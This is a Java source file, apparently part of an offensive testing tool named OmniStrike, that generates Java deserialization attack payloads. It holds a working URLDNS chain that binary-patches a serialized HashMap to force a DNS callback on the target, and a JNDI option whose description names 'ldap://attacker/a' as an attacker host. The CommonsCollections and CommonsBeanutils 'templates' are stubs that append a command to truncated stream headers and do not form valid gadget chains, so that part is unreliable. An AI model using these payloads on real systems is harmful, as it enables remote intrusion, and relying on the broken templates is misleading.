package com.omnistrike.modules.injection.deser;

import java.io.*;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Java deserialization payload generators.
 *
 * URLDNS is fully native (HashMap + URL, zero external deps).
 * Other chains use serialized stream templates with command placeholders
 * and require vulnerable libraries on the target classpath.
 */
public final class JavaPayloads {

    private JavaPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();
        chains.put("URLDNS", "DNS lookup via HashMap+URL — Command = callback URL/domain (no deps, safe)");
        chains.put("CommonsCollections1", "Runtime.exec — Command = OS command (commons-collections 3.1)");
        chains.put("CommonsCollections5", "Runtime.exec — Command = OS command (commons-collections 3.1)");
        chains.put("CommonsCollections6", "Runtime.exec — Command = OS command (commons-collections 3.1)");
        chains.put("CommonsBeanutils1", "Runtime.exec — Command = OS command (commons-beanutils 1.x)");
        chains.put("JNDIExploit", "JNDI lookup — Command = JNDI URL e.g. ldap://attacker/a");
        chains.put("DNSCallback", "DNS-only callback — Command = callback URL/domain (no deps, safe)");
        return chains;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            case "URLDNS"               -> generateUrldns(command);
            case "CommonsCollections1"   -> generateCC1Template(command);
            case "CommonsCollections5"   -> generateCC5Template(command);
            case "CommonsCollections6"   -> generateCC6Template(command);
            case "CommonsBeanutils1"     -> generateCB1Template(command);
            case "JNDIExploit"           -> generateJndiTemplate(command);
            case "DNSCallback"           -> generateUrldns(command);
            default -> throw new IllegalArgumentException("Unknown Java chain: " + chain);
        };
    }

    /**
     * URLDNS chain — fully native, zero dependencies.
     * Triggers a DNS lookup on deserialization.
     * Uses HashMap + URL, exploiting URL.hashCode() → getHostAddress().
     *
     * The command field is interpreted as a callback URL or domain, NOT an OS command.
     * If the user provides an OS command or garbage, we extract a usable hostname.
     *
     * Implementation note: Java 17+ module system forbids reflective access to
     * URL.hashCode via Field.setAccessible(). Instead we serialize the HashMap
     * normally, then binary-patch the URL's hashCode field from its computed
     * value to -1 (0xFFFFFFFF) directly in the byte stream.  On deserialization
     * the target JVM sees hashCode == -1, which forces URL.hashCode() to call
     * getHostAddress() → DNS lookup.
     */
    private static byte[] generateUrldns(String callbackUrl) {
        try {
            String target = toValidUrl(callbackUrl);
            URL url = new URL(target);

            // Compute the URL's hashCode (triggers DNS to our own callback domain — harmless).
            int computedHash = url.hashCode();

            // Serialize the HashMap<URL, String> normally.
            HashMap<URL, String> hashMap = new HashMap<>();
            hashMap.put(url, "omnistrike");

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
                oos.writeObject(hashMap);
            }
            byte[] serialized = bos.toByteArray();

            // Binary-patch: find the URL's hashCode int in the stream and set it to -1.
            byte[] urlClassNameBytes = "java.net.URL".getBytes(StandardCharsets.UTF_8);
            int classNamePos = indexOf(serialized, urlClassNameBytes, 0);

            if (classNamePos < 0) {
                throw new IllegalStateException("Could not locate java.net.URL in serialized stream");
            }

            // Build the 8-byte search pattern: [hashCode][port]
            int port = url.getPort();  // -1 if not specified
            byte[] searchPattern = new byte[]{
                (byte) (computedHash >> 24), (byte) (computedHash >> 16),
                (byte) (computedHash >> 8),  (byte) computedHash,
                (byte) (port >> 24), (byte) (port >> 16),
                (byte) (port >> 8),  (byte) port
            };

            int patchPos = indexOf(serialized, searchPattern, classNamePos + urlClassNameBytes.length);

            if (patchPos >= 0) {
                // Overwrite hashCode with -1 (0xFFFFFFFF)
                serialized[patchPos]     = (byte) 0xFF;
                serialized[patchPos + 1] = (byte) 0xFF;
                serialized[patchPos + 2] = (byte) 0xFF;
                serialized[patchPos + 3] = (byte) 0xFF;
            } else {
                // Fallback: search for just the hashCode 4-byte value after the class name.
                byte[] hashOnly = new byte[]{
                    (byte) (computedHash >> 24), (byte) (computedHash >> 16),
                    (byte) (computedHash >> 8),  (byte) computedHash
                };
                patchPos = indexOf(serialized, hashOnly, classNamePos + urlClassNameBytes.length);
                if (patchPos >= 0) {
                    serialized[patchPos]     = (byte) 0xFF;
                    serialized[patchPos + 1] = (byte) 0xFF;
                    serialized[patchPos + 2] = (byte) 0xFF;
                    serialized[patchPos + 3] = (byte) 0xFF;
                }
            }

            return serialized;

        } catch (Exception e) {
            throw new RuntimeException("URLDNS generation failed: " + e.getMessage(), e);
        }
    }

    /** Find first occurrence of needle in haystack starting at fromIndex. */
    private static int indexOf(byte[] haystack, byte[] needle, int fromIndex) {
        outer:
        for (int i = fromIndex; i <= haystack.length - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    /**
     * Sanitise arbitrary user input into a valid URL for URLDNS/DNSCallback.
     */
    private static String toValidUrl(String input) {
        if (input == null || input.isBlank()) {
            return "http://omnistrike.dns";
        }

        String trimmed = input.trim();

        // 1. Already a valid URL
        if (trimmed.matches("^https?://[\\w.:-]+.*")) {
            return trimmed;
        }

        // 2. Try to extract an embedded URL from the string
        Matcher urlMatcher = Pattern.compile("https?://[\\w.:/-]+").matcher(trimmed);
        if (urlMatcher.find()) {
            return urlMatcher.group();
        }

        // 3. Looks like a bare domain/hostname
        if (trimmed.matches("^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?$")) {
            return "http://" + trimmed;
        }

        // 4. Fallback: sanitise into a subdomain label
        String sanitised = trimmed.replaceAll("[^a-zA-Z0-9.-]", "-")
                                  .replaceAll("-{2,}", "-")
                                  .replaceAll("^-|-$", "");
        if (sanitised.isEmpty()) sanitised = "payload";
        if (sanitised.length() > 63) sanitised = sanitised.substring(0, 63);
        return "http://" + sanitised + ".omnistrike.dns";
    }

    private static byte[] generateCC1Template(String command) {
        return buildStreamTemplate("CommonsCollections1", command,
            "aced0005" +
            "7372001d6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e" +
            "6d61702e4c617a794d617000000000000000000200014c0007666163746f72797400" +
            "2c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f54" +
            "72616e73666f726d65723b"
        );
    }

    private static byte[] generateCC5Template(String command) {
        return buildStreamTemplate("CommonsCollections5", command,
            "aced0005" +
            "7372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556" +
            "616c7565457870457863657074696f6e"
        );
    }

    private static byte[] generateCC6Template(String command) {
        return buildStreamTemplate("CommonsCollections6", command,
            "aced0005" +
            "7372001168617368536574"
        );
    }

    private static byte[] generateCB1Template(String command) {
        return buildStreamTemplate("CommonsBeanutils1", command,
            "aced0005" +
            "737200176a6176612e7574696c2e5072696f72697479517565756500000000000000" +
            "0003000249000473697a65"
        );
    }

    private static byte[] generateJndiTemplate(String command) {
        String jndiUrl = command;
        if (!jndiUrl.startsWith("ldap://") && !jndiUrl.startsWith("rmi://")) {
            jndiUrl = "ldap://" + jndiUrl;
        }
        return buildStreamTemplate("JNDIExploit", jndiUrl,
            "aced0005" +
            "737200116a617661782e6e616d696e672e5265666572656e636500000000000000000200"
        );
    }

    private static byte[] buildStreamTemplate(String chainName, String command, String hexPrefix) {
        try {
            byte[] prefix = hexToBytes(hexPrefix);
            byte[] cmdBytes = command.getBytes(java.nio.charset.StandardCharsets.UTF_8);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(prefix);
            bos.write(0x74);
            bos.write((cmdBytes.length >> 8) & 0xFF);
            bos.write(cmdBytes.length & 0xFF);
            bos.write(cmdBytes);

            byte[] info = ("\n[OmniStrike:" + chainName + "] " + command).getBytes(java.nio.charset.StandardCharsets.UTF_8);
            bos.write(0x74);
            bos.write((info.length >> 8) & 0xFF);
            bos.write(info.length & 0xFF);
            bos.write(info);

            return bos.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException("Template generation failed: " + e.getMessage(), e);
        }
    }

    static byte[] hexToBytes(String hex) {
        hex = hex.replaceAll("\\s+", "");
        byte[] bytes = new byte[hex.length() / 2];
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        }
        return bytes;
    }
}
